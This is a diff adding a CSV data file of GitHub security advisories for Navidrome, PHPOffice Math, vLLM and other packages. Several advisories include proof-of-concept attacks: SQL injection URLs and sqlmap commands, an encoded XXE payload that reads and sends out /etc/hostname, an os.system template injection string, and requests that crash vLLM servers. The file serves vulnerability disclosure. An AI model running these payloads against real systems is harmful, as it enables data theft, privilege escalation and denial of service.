@@ -1,0 +1,518 @@
+id,summary,description,severity,cvss_score,cvss_vector,affected_packages,published_date,updated_date,references
+GHSA-f238-rggp-82m3,Navidrome Transcoding Permission Bypass Vulnerability Report,"### Summary
+A permission verification flaw in Navidrome allows any authenticated regular user to bypass authorization checks and perform administrator-only transcoding configuration operations, including creating, modifying, and deleting transcoding settings.
+
+### Details
+Navidrome supports transcoding functionality which, although disabled by default, should restrict configuration operations to administrators only. However, the application fails to properly validate whether a user has administrative privileges when handling transcoding configuration requests.
+
+The vulnerability exists in the API endpoints that manage transcoding settings. When a regular user sends requests to these endpoints, the application processes them without verifying if the user has administrative privileges, despite the JWT token clearly indicating the user is not an administrator (`""adm"":false`).
+
+The affected endpoints include:
+- `POST /api/transcoding` (Create transcoding configuration)
+- `PUT /api/transcoding/:id` (Update transcoding configuration)
+- `DELETE /api/transcoding/:id` (Delete transcoding configuration)
+- `GET /api/transcoding` (List transcoding configurations)
+
+### PoC
+1. Set up Navidrome with transcoding enabled
+2. Log in as a regular user (non-administrator)
+3. Send the following HTTP request:
+
+```
+POST /api/transcoding HTTP/1.1
+Host: 192.168.199.134:4533
+Content-Length: 81
+x-nd-client-unique-id: e559d130-4295-401e-b65f-be7fdd564e
+accept: application/json
+x-nd-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOmZhbHNlLCJleHAiOjE3NDY2MzIyNDEsImlhdCI6MTc0NjQ1ODk5NiwiaXNzIjoiTkQiLCJzdWIiOiJ1c2VyMSIsInVpZCI6InV3THJGcWxXNHhnNEt4QjNxMk85eTYifQ.jqv2eESY8QTAHY-oLbBmO0v8IyDXrofvXqQgXSrJ6SM
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+content-type: application/json
+Origin: http://192.168.199.134:4533
+Referer: http://192.168.199.134:4533/app/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+
+{""defaultBitRate"":192,""name"":""trans6"",""command"":""tran6"",""targetFormat"":""tran6""}
+```
+
+4. The request will succeed despite the JWT token clearly indicating the user is not an administrator (`""adm"":false`)
+5. The same operation can be performed with administrator credentials, confirming that no authorization check is being performed
+
+### Impact
+This vulnerability allows regular users to modify critical system configurations that should be restricted to administrators only. While Navidrome does not recommend enabling transcoding in production environments, when it is enabled, proper authorization checks should still be enforced.
+
+The security impact includes:
+1. **Privilege Escalation**: Regular users can perform administrator-only actions
+2. **System Configuration Tampering**: Unauthorized users can modify transcoding settings, potentially affecting system performance or functionality
+3. **Potential Command Injection**: Since transcoding settings include command parameters, this could potentially lead to command injection if not properly sanitized
+
+In the threat model where administrators are trusted but regular users are not, this vulnerability represents a significant security risk when transcoding is enabled.",high,,,go: github.com/navidrome/navidrome,2025-05-29T22:36:49Z,2025-05-30T21:42:30Z,https://github.com/navidrome/navidrome/security/advisories/GHSA-f238-rggp-82m3; https://github.com/navidrome/navidrome/pull/4096; https://github.com/navidrome/navidrome/commit/e5438552c63fecb6284e1b179dddae91ede869c8; https://nvd.nist.gov/vuln/detail/CVE-2025-48948; https://github.com/advisories/GHSA-f238-rggp-82m3
+GHSA-5wgp-vjxm-3x2r,Navidrome allows SQL Injection via role parameter,"## 🛡 **Security Advisory: SQL Injection Vulnerability in Navidrome v0.55.2**
+
+### **Overview**
+
+This vulnerability arises due to improper input validation on the **`role`** parameter within the API endpoint **`/api/artist`**. Attackers can exploit this flaw to inject arbitrary SQL queries, potentially gaining unauthorized access to the backend database and compromising sensitive user information.
+
+---
+
+### **Details**
+
+* **Vulnerable Component**:
+  API endpoint → `/api/artist`
+  Parameter → `role`
+
+* **Vulnerability Type**:
+  SQL Injection (stacked queries, UNION queries)
+
+* **Database Affected**:
+  SQLite (confirmed exploitation via SQLite-specific payloads)
+
+* **Impact**:
+  Successful exploitation allows an unauthenticated attacker to:
+
+  * Execute arbitrary SQL commands
+  * Extract or manipulate sensitive data (e.g., user records, playlists)
+  * Potentially escalate privileges or disrupt service availability
+
+---
+
+### **Proof of Concept (PoC)**
+
+**Example Exploit Command**:
+
+```bash
+sqlmap.py -r navi --level 5 --risk 3 -a --banner --batch --tamper charencode --dbms sqlite
+```
+
+**Sample Payloads**:
+
+* **Stacked Queries**:
+
+  ```
+  http://navidrome/api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
+  ```
+
+* **UNION-Based Query**:
+
+  ```
+  http://navidrome.local/api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist') UNION ALL SELECT 92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,CHAR(113,98,118,98,113)||CHAR(113,84,86,119,114,71,106,104,90,118,120,104,79,66,104,108,121,106,70,68,90,113,104,117,67,98,113,67,103,84,71,120,119,119,117,121,81,76,100,71)||CHAR(113,120,112,106,113),92,92,92,92-- Mtny
+  ```
+
+**Example HTTP Request**:
+
+```http
+GET /api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist* HTTP/2
+Host: <TARGET HOST>
+Cookie: <REPLACE WITH VALID COOKIE>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: application/json
+X-Nd-Authorization: <REPLACE WITH AUTH TOKEN>
+X-Nd-Client-Unique-Id: <REPLACE WITH CLIENT ID>
+```
+
+---",high,,,go: github.com/navidrome/navidrome,2025-05-29T17:27:56Z,2025-05-30T21:42:22Z,https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r; https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6; https://nvd.nist.gov/vuln/detail/CVE-2025-48949; https://github.com/advisories/GHSA-5wgp-vjxm-3x2r
+GHSA-42hm-pq2f-3r7m,PHPOffice Math allows XXE when processing an XML file in the MathML format ,"**Product:** Math
+**Version:** 0.2.0
+**CWE-ID:** CWE-611: Improper Restriction of XML External Entity Reference
+**CVSS vector v.4.0:** 8.7 (AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)
+**CVSS vector v.3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+**Description:** An attacker can create a special XML file, during which it processed, external entities are loaded, and it’s possible to read local server files.  
+**Impact:** Local server files reading
+**Vulnerable component:** The [`loadXML`](https://github.com/PHPOffice/Math/blob/c3ecbf35601e2a322bf2ddba48589d79ac827b92/src/Math/Reader/MathML.php#L38C9-L38C55) function with the unsafe [`LIBXML_DTDLOAD`](https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload) flag, the [`MathML`](https://github.com/PHPOffice/Math/blob/master/src/Math/Reader/MathML.php) class
+**Exploitation conditions:** The vulnerability applies only to reading a file in the `MathML` format.
+**Mitigation:** If there is no option to refuse using the [`LIBXML_DTDLOAD`](https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload) flag, it’s recommended to filter external entities through the implementation of the [`custom external entity loader function`](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php).
+**Researcher: Aleksandr Zhurnakov (Positive Technologies)**
+
+## Research
+Zero-day vulnerability was discovered in the [Math](https://github.com/PHPOffice/Math) library in the detailed process of the XXE vulnerability research in PHP.
+Loading XML data, using the standard [`libxml`](https://www.php.net/manual/en/book.libxml.php) extension and the [`LIBXML_DTDLOAD`](https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload) flag without additional filtration, leads to XXE.
+
+Below are steps to reproduce the vulnerability.
+
+1. Preparation:
+
+- The payload was tested on the PHP versions >= 8.1.
+- The [composer](https://getcomposer.org/) manager is used to install the latest version of the Math library.
+- PHP has to be configurated with [Zlib](https://www.php.net/manual/ru/book.zlib.php) support.
+- The necessary [requirements](https://github.com/PHPOffice/Math?tab=readme-ov-file#requirements) for the Math library must be installed.
+- The `netcat` utility is used for demonstration exfiltration.
+
+2. Make `math` directory and then moving into it.
+````
+mkdir math && cd math
+````
+
+3. Install the latest actual version of the library (Figure 1). 
+```
+composer require phpoffice/math
+````
+_Figure 1. Installing the library_
+<img width=""630"" alt=""fig2"" src=""https://github.com/user-attachments/assets/bb0c6781-4f5a-411c-970d-9402e652ad87"" />
+
+4. Create `poc.xml` file (Listing 1): 
+
+_Listing 1. Creating `poc.xml`_
+```
+xml     
+<?xml version=""1.0"" encoding=""UTF-8""?>     <!DOCTYPE x SYSTEM 
+""php://filter/convert.base64-
+decode/zlib.inflate/resource=data:,7Ztdb9owFIbv%2bRVZJ9armNjOZ2k7QUaL%2bRYO2nqFUn
+BFNQaMptP272cnNFuTsBbSskg1iATZzvGxn/ccX3A4fdfoecS7UsrK1A98hV5Rr9FVjlaz1UmlcnM7D9i
+6MlkufrB1AK79O2bqKltMllMWt96KL6ADwci7sJ4Yu0vr9/tlwKbqan27CPzrOXvevFGrbRvOGIseaCa7
+TAxok1x44xahXzQEcdKPKZPevap3RZw920I0VscWGLlU1efPsy0c5cbV1AoI7ZuOMCZW12nkcP9Q2%2bQ
+ObBNmL6ajg8s6xJqmJTrq5NIArX6zVk8Zcwwt4fPuLvHnbeBSvpdIQ6g93MvUv3CHqKNrmtEW4EYmCr5g
+DT5QzyNWE4x6xO1/aqQmgMhGYgaVDFUnScKltbFnaJoKHRuHK0L1pIkuaYselMe9cPUqRmm5C51u00kkh
+y1S3aBougkl7e4d6RGaTYeSehdCjAG/O/p%2bYfKyQsoLmgdlmsFYQFDjh6GWJyGE0ZfMX08EZtwNTdAY
+ud7nLcksnwppA2UnqpCzgyDo1QadAU3vLOQZ82EHMxAi0KVcq7rzas5xD6AQoeqkYkgk02abukkJ/z%2b
+Nvkj%2bjUy16Ba5d/S8anhBLwt44EgGkoFkIBlIBpKBZCAZSAaSgWQgGUgGkoFkIBlIBpKBZCAZSAaSgW
+QgGUgGxWOwW2nF7kt%2by7/Kb3ag2GUTUgBvXAAxiKxt4Is3sB4WniVrOvhwzB0CXerg5GN9esGRQv7Rg
+QdMmMO9sIwtc/sIJUOCsY4ee7f7FIWu2Si4euKan8wg58nFsEIXxYGntgZqMog3Z2FrgPhgyzIOlsmijo
+wqwb0jyMqMoGEbarqdOpP/iqFISMkSVFG1Z5p8f3OK%2bxAZ7gClpgUPg70rq0T2RIkcup/0newQ7NbcU
+Xv/DPl4LL/N7hdfn2dp07pmd8v79YSdVVgwqcyWd8HC/8aOzkunf6r%2b2c8bpSxK/6uPmlf%2br/nSny
+rHcduH99iqKiz7HwLxTLMgEM0QWUDjb3ji8NdHPslZmV%2bqR%2bfH56Xyxni1VGbV0m8="" 
+[]><foo></foo>
+```
+5. Create `math.php` file (Listing 2): 
+
+*Listing 2. Creating `math.php`*
+````
+<?php
+    require_once ""./vendor/autoload.php"";
+
+    $reader = new \PhpOffice\Math\Reader\MathML();
+    $reader->read(
+        file_get_contents('poc.xml')
+    );
+````
+6. The payload (see the step 4) is set to exfiltrate the `/etc/hostname` file through `http://127.0.0.1:9999/`, so the listening socket is launched at the `9999` port (Figure 2)
+
+_Figure 2. Launching the listening socket_
+<img width=""550"" alt=""fig2"" src=""https://github.com/user-attachments/assets/6da5b966-70be-4e3e-9bde-c6baf4dfef34"" />
+
+7. Execute php-script via console: 
+````
+php math.php 
+````
+
+6 characters from the `/etc/hostname` file will be exfiltrated to the `9999` port in base64 format (Figure 3). 
+
+_Figure 3. Characters exfiltration_
+<img width=""520"" alt=""fig3"" src=""https://github.com/user-attachments/assets/f0eae873-d156-442f-ab08-12dd94a8dbe9"" />
+
+Decode the received data from base64 removing the last `M` character (the payload feature) (Figure 4).
+
+*Figure 4. Data decoding*
+<img width=""595"" alt=""fig4"" src=""https://github.com/user-attachments/assets/7a091a07-7856-41a0-b1bd-3d8009303ced"" />
+
+8. By changing the payload, the remaining file can be received. 
+
+## Credits
+Aleksandr Zhurnakov (Positive Technologies)",high,,,composer: phpoffice/math,2025-05-29T17:27:39Z,2025-05-30T21:42:12Z,https://github.com/PHPOffice/Math/security/advisories/GHSA-42hm-pq2f-3r7m; https://github.com/PHPOffice/Math/commit/fc31c8f57a7a81f962cbf389fd89f4d9d06fc99a; https://nvd.nist.gov/vuln/detail/CVE-2025-48882; https://github.com/advisories/GHSA-42hm-pq2f-3r7m
+GHSA-vrq3-r879-7m65,vLLM Tool Schema allows DoS via Malformed pattern and type Fields,"### Summary
+The vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected or malformed input in the ""pattern"" and ""type"" fields when the tools functionality is invoked. These inputs are not validated before being compiled or parsed, causing a crash of the inference worker with a single request. The worker will remain down until it is restarted. 
+
+### Details
+The ""type"" field is expected to be one of: ""string"", ""number"", ""object"", ""boolean"", ""array"", or ""null"". Supplying any other value will cause the worker to crash with the following error:
+
+RuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637: Unsupported type ""something_or_nothing""
+
+The ""pattern"" field undergoes Jinja2 rendering (I think) prior to being passed unsafely into the native regex compiler without validation or escaping. This allows malformed expressions to reach the underlying C++ regex engine, resulting in fatal errors.
+
+For example, the following inputs will crash the worker:
+
+Unclosed {, [, or (
+
+Closed:{} and []
+
+Here are some of runtime errors on the crash depending on what gets injected:
+
+RuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73: Regex parsing error at position 4: The parenthesis is not closed.
+RuntimeError: [10:52:27] /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition count.
+RuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error at position 6: Two consecutive repetition modifiers are not allowed.
+
+### PoC
+Here is the POST request using the type field to crash the worker. Note the type field is set to ""something"" rather than the expected types it is looking for:
+POST /v1/chat/completions HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: 
+Content-Type: application/json
+Content-Length: 579
+Origin: 
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+Connection: keep-alive
+
+{
+  ""model"": ""mistral-nemo-instruct"",
+  ""messages"": [{ ""role"": ""user"", ""content"": ""crash via type"" }],
+  ""tools"": [
+    {
+      ""type"": ""function"",
+      ""function"": {
+        ""name"": ""crash01"",
+        ""parameters"": {
+          ""type"": ""object"",
+          ""properties"": {
+            ""a"": {
+              ""type"": ""something""
+            }
+          }
+        }
+      }
+    }
+  ],
+  ""tool_choice"": {
+    ""type"": ""function"",
+    ""function"": {
+      ""name"": ""crash01"",
+      ""arguments"": { ""a"": ""test"" }
+    }
+  },
+  ""stream"": false,
+  ""max_tokens"": 1
+}
+
+Here is the POST request using the pattern field to crash the worker. Note the pattern field is set to a RCE payload, it could have just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.
+
+POST /v1/chat/completions HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: 
+Content-Type: application/json
+Content-Length: 718
+Origin: 
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+Connection: keep-alive
+
+{
+  ""model"": ""mistral-nemo-instruct"",
+  ""messages"": [
+    {
+      ""role"": ""user"",
+      ""content"": ""Crash via Pattern""
+    }
+  ],
+  ""tools"": [
+    {
+      ""type"": ""function"",
+      ""function"": {
+        ""name"": ""crash02"",
+        ""parameters"": {
+          ""type"": ""object"",
+          ""properties"": {
+            ""a"": {
+              ""type"": ""string"",
+""pattern"": ""{{ __import__('os').system('echo RCE_OK > /tmp/pwned') or 'SAFE' }}""
+            }
+          }
+        }
+      }
+    }
+  ],
+  ""tool_choice"": {
+    ""type"": ""function"",
+    ""function"": {
+      ""name"": ""crash02""
+    }
+  },
+  ""stream"": false,
+  ""max_tokens"": 32,
+  ""temperature"": 0.2,
+  ""top_p"": 1,
+  ""n"": 1
+}
+
+### Impact
+Backend workers can be crashed causing anyone to using the inference engine to get 500 internal server errors on subsequent requests. 
+
+### Fix
+
+* https://github.com/vllm-project/vllm/pull/17623",medium,6.5,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,pip: vllm,2025-05-28T19:42:32Z,2025-05-30T21:41:07Z,https://github.com/vllm-project/vllm/security/advisories/GHSA-vrq3-r879-7m65; https://github.com/vllm-project/vllm/pull/17623; https://nvd.nist.gov/vuln/detail/CVE-2025-48944; https://github.com/advisories/GHSA-vrq3-r879-7m65
+GHSA-9hcf-v7m4-6m2j,vLLM allows clients to crash the openai server with invalid regex,"### Impact
+
+A denial of service bug caused the vLLM server to crash if an invalid regex was provided while using structured output. This vulnerability is similar to [GHSA-6qc9-v4r8-22xg](https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg), but for regex instead of a JSON schema.
+
+Issue with more details: https://github.com/vllm-project/vllm/issues/17313
+
+### Patches
+
+* https://github.com/vllm-project/vllm/pull/17623",medium,6.5,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,pip: vllm,2025-05-28T19:42:12Z,2025-05-30T21:40:56Z,https://github.com/vllm-project/vllm/security/advisories/GHSA-9hcf-v7m4-6m2j; https://github.com/vllm-project/vllm/issues/17313; https://github.com/vllm-project/vllm/pull/17623; https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff; https://nvd.nist.gov/vuln/detail/CVE-2025-48943; https://github.com/advisories/GHSA-9hcf-v7m4-6m2j
+GHSA-6qc9-v4r8-22xg,vLLM DOS: Remotely kill vllm over http with invalid JSON schema,"### Summary
+Hitting the  /v1/completions API with a invalid json_schema as a Guided Param will kill the vllm server
+
+
+### Details
+The following API call 
+`(venv) [derekh@ip-172-31-15-108 ]$ curl -s http://localhost:8000/v1/completions -H ""Content-Type: application/json"" -d '{""model"": ""meta-llama/Llama-3.2-3B-Instruct"",""prompt"": ""Name two great reasons to visit Sligo "", ""max_tokens"": 10, ""temperature"": 0.5, ""guided_json"":""{\""properties\"":{\""reason\"":{\""type\"": \""stsring\""}}}""}'   
+`
+will provoke a Uncaught exceptions from xgrammer in 
+`./lib64/python3.11/site-packages/xgrammar/compiler.py
+`
+
+Issue with more information: https://github.com/vllm-project/vllm/issues/17248
+
+### PoC
+Make a call to vllm with invalid json_scema e.g. `{\""properties\"":{\""reason\"":{\""type\"": \""stsring\""}}}`
+
+`curl -s http://localhost:8000/v1/completions -H ""Content-Type: application/json"" -d '{""model"": ""meta-llama/Llama-3.2-3B-Instruct"",""prompt"": ""Name two great reasons to visit Sligo "", ""max_tokens"": 10, ""temperature"": 0.5, ""guided_json"":""{\""properties\"":{\""reason\"":{\""type\"": \""stsring\""}}}""}'
+`
+### Impact
+vllm crashes
+
+
+example traceback
+```
+ERROR 03-26 17:25:01 [core.py:340] EngineCore hit an exception: Traceback (most recent call last):
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/engine/core.py"", line 333, in run_engine_core
+ERROR 03-26 17:25:01 [core.py:340]     engine_core.run_busy_loop()
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/engine/core.py"", line 367, in run_busy_loop
+ERROR 03-26 17:25:01 [core.py:340]     outputs = step_fn()
+ERROR 03-26 17:25:01 [core.py:340]               ^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/engine/core.py"", line 181, in step
+ERROR 03-26 17:25:01 [core.py:340]     scheduler_output = self.scheduler.schedule()
+ERROR 03-26 17:25:01 [core.py:340]                        ^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/core/scheduler.py"", line 257, in schedule
+ERROR 03-26 17:25:01 [core.py:340]     if structured_output_req and structured_output_req.grammar:
+ERROR 03-26 17:25:01 [core.py:340]                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py"", line 41, in grammar
+ERROR 03-26 17:25:01 [core.py:340]     completed = self._check_grammar_completion()
+ERROR 03-26 17:25:01 [core.py:340]                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/structured_output/request.py"", line 29, in _check_grammar_completion
+ERROR 03-26 17:25:01 [core.py:340]     self._grammar = self._grammar.result(timeout=0.0001)
+ERROR 03-26 17:25:01 [core.py:340]                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/usr/lib64/python3.11/concurrent/futures/_base.py"", line 456, in result
+ERROR 03-26 17:25:01 [core.py:340]     return self.__get_result()
+ERROR 03-26 17:25:01 [core.py:340]            ^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/usr/lib64/python3.11/concurrent/futures/_base.py"", line 401, in __get_result
+ERROR 03-26 17:25:01 [core.py:340]     raise self._exception
+ERROR 03-26 17:25:01 [core.py:340]   File ""/usr/lib64/python3.11/concurrent/futures/thread.py"", line 58, in run
+ERROR 03-26 17:25:01 [core.py:340]     result = self.fn(*self.args, **self.kwargs)
+ERROR 03-26 17:25:01 [core.py:340]              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/vllm/v1/structured_output/__init__.py"", line 120, in _async_create_grammar
+ERROR 03-26 17:25:01 [core.py:340]     ctx = self.compiler.compile_json_schema(grammar_spec,
+ERROR 03-26 17:25:01 [core.py:340]           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ERROR 03-26 17:25:01 [core.py:340]   File ""/home/derekh/workarea/vllm/venv/lib64/python3.11/site-packages/xgrammar/compiler.py"", line 101, in compile_json_schema
+ERROR 03-26 17:25:01 [core.py:340]     self._handle.compile_json_schema(
+ERROR 03-26 17:25:01 [core.py:340] RuntimeError: [17:25:01] /project/cpp/json_schema_converter.cc:795: Check failed: (schema.is<picojson::object>()) is false: Schema should be an object or bool
+ERROR 03-26 17:25:01 [core.py:340] 
+ERROR 03-26 17:25:01 [core.py:340] 
+CRITICAL 03-26 17:25:01 [core_client.py:269] Got fatal signal from worker processes, shutting down. See stack trace above for root cause issue.
+```
+
+### Fix
+
+* https://github.com/vllm-project/vllm/pull/17623",medium,6.5,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,pip: vllm,2025-05-28T19:41:53Z,2025-05-30T21:40:44Z,https://github.com/vllm-project/vllm/security/advisories/GHSA-6qc9-v4r8-22xg; https://github.com/vllm-project/vllm/issues/17248; https://github.com/vllm-project/vllm/pull/17623; https://github.com/vllm-project/vllm/commit/08bf7840780980c7568c573c70a6a8db94fd45ff; https://nvd.nist.gov/vuln/detail/CVE-2025-48942; https://github.com/advisories/GHSA-6qc9-v4r8-22xg
+GHSA-3432-fmrf-7vmh,Chrome PHP is missing encoding in `CssSelector`,"### Impact
+
+CSS Selector expressions are not properly encoded, which can lead to XSS (cross-site scripting) vulnerabilities.
+
+### Patches
+
+This is patched in v1.14.0.
+
+### Workarounds
+
+Users can apply encoding manually to their selectors, if they are unable to upgrade.",medium,,,composer: chrome-php/chrome,2025-05-28T16:06:03Z,2025-05-30T21:40:34Z,https://github.com/chrome-php/chrome/security/advisories/GHSA-3432-fmrf-7vmh; https://github.com/chrome-php/chrome/pull/691; https://github.com/chrome-php/chrome/commit/34b2b8d1691f4e3940b1e1e95d388fffe81169c8; https://nvd.nist.gov/vuln/detail/CVE-2025-48883; https://github.com/advisories/GHSA-3432-fmrf-7vmh
+GHSA-w6q7-j642-7c25,"vLLM has a Regular Expression Denial of Service (ReDoS, Exponential Complexity) Vulnerability in `pythonic_tool_parser.py`","## Summary
+
+A Regular Expression Denial of Service (ReDoS) vulnerability exists in the file [`vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py`](https://github.com/vllm-project/vllm/blob/main/vllm/entrypoints/openai/tool_parsers/pythonic_tool_parser.py) of the vLLM project. The root cause is the use of a highly complex and nested regular expression for tool call detection, which can be exploited by an attacker to cause severe performance degradation or make the service unavailable.
+
+## Details
+
+The following regular expression is used to match tool/function call patterns:
+```
+r""\[([a-zA-Z]+\w*\(([a-zA-Z]+\w*=.*,\s*)*([a-zA-Z]+\w*=.*\s)?\),\s*)*([a-zA-Z]+\w*\(([a-zA-Z]+\w*=.*,\s*)*([a-zA-Z]+\w*=.*\s*)?\)\s*)+\]""
+```
+This pattern contains multiple nested quantifiers (`*`, `+`), optional groups, and inner repetitions which make it vulnerable to catastrophic backtracking.
+
+**Attack Example:**
+A malicious input such as  
+```
+[A(A=	)A(A=,		)A(A=,		)A(A=,		)... (repeated dozens of times) ...]
+
+or
+
+""[A(A="" + ""\t)A(A=,\t"" * repeat
+```
+
+
+
+can cause the regular expression engine to consume CPU exponentially with the input length, effectively freezing or crashing the server (DoS).
+
+**Proof of Concept:**
+A Python script demonstrates that matching such a crafted string with the above regex results in exponential time complexity. Even moderate input lengths can bring the system to a halt.
+
+```
+Length: 22, Time: 0.0000 seconds, Match: False
+Length: 38, Time: 0.0010 seconds, Match: False
+Length: 54, Time: 0.0250 seconds, Match: False
+Length: 70, Time: 0.5185 seconds, Match: False
+Length: 86, Time: 13.2703 seconds, Match: False
+Length: 102, Time: 319.0717 seconds, Match: False
+```
+
+## Impact
+
+- **Denial of Service (DoS):** An attacker can trigger a denial of service by sending specially crafted payloads to any API or interface that invokes this regex, causing excessive CPU usage and making the vLLM service unavailable.
+- **Resource Exhaustion and Memory Retention:** As this regex is invoked during function call parsing, the matching process may hold on to significant CPU and memory resources for extended periods (due to catastrophic backtracking). In the context of vLLM, this also means that the associated KV cache (used for model inference and typically stored in GPU memory) is not released in a timely manner. This can lead to GPU memory exhaustion, degraded throughput, and service instability.
+- **Potential for Broader System Instability:** Resource exhaustion from stuck or slow requests may cascade into broader system instability or service downtime if not mitigated.
+
+## Fix
+
+* https://github.com/vllm-project/vllm/pull/18454
+* Note that while this change has significantly improved performance, this regex may still be problematic. It has gone from exponential time complexity, O(2^N), to O(N^2).",medium,6.5,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,pip: vllm,2025-05-28T17:49:33Z,2025-05-30T21:40:24Z,https://github.com/vllm-project/vllm/security/advisories/GHSA-w6q7-j642-7c25; https://github.com/vllm-project/vllm/pull/18454; https://github.com/vllm-project/vllm/commit/4fc1bf813ad80172c1db31264beaef7d93fe0601; https://nvd.nist.gov/vuln/detail/CVE-2025-48887; https://github.com/advisories/GHSA-w6q7-j642-7c25
+GHSA-9qgq-93c7-9hm4,Moodle stored Cross-site Scripting (XSS),Additional sanitizing was required when opening the equation editor to prevent a stored Cross-site Scripting (XSS) risk when editing another user's equation.,medium,6.1,CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N,composer: moodle/moodle; composer: moodle/moodle; composer: moodle/moodle,2024-05-31T21:30:52Z,2025-05-30T21:37:51Z,https://nvd.nist.gov/vuln/detail/CVE-2024-33997; https://moodle.org/mod/forum/discuss.php?d=458385; http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-81352; https://github.com/moodle/moodle/commit/25b1b643c873f6d83ae61903012896b2811fa3bb; https://github.com/advisories/GHSA-9qgq-93c7-9hm4
+GHSA-wv8j-m3hx-924j,Arrow2 allows out of bounds access in public safe API,"`Rows::row_unchecked()` allows out of bounds access to the underlying buffer without sufficient checks.
+
+The arrow2 crate is no longer maintained, so there are no plans to fix this issue. Users are advised to migrate to the arrow crate, instead.",high,,,rust: arrow2,2025-05-30T20:09:56Z,2025-05-30T20:09:57Z,https://rustsec.org/advisories/RUSTSEC-2025-0038.html; https://github.com/advisories/GHSA-wv8j-m3hx-924j
+GHSA-v75g-77vf-6jjq,Para Server Logs Sensitive Information,"CWE ID: CWE-532 (Insertion of Sensitive Information into Log File)
+CVSS:  7.5 (High)
+Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+
+**Affected Component:** Para Server Initialization Logging
+**Version:** Para v1.50.6
+**File Path:** `para-1.50.6/para-server/src/main/java/com/erudika/para/server/utils/HealthUtils.java`
+**Vulnerable Line(s):** Line 132 (via `logger.info(...)` with root credentials)
+
+Technical Details:
+
+The vulnerability is located in the HealthUtils.java file, where a failed configuration file write triggers the following logging statement:
+```java
+logger.info(""Initialized root app with access key '{}' and secret '{}', but could not write these to {}."",
+    rootAppCredentials.get(""accessKey""),
+    rootAppCredentials.get(""secretKey""),
+    confFile);
+```
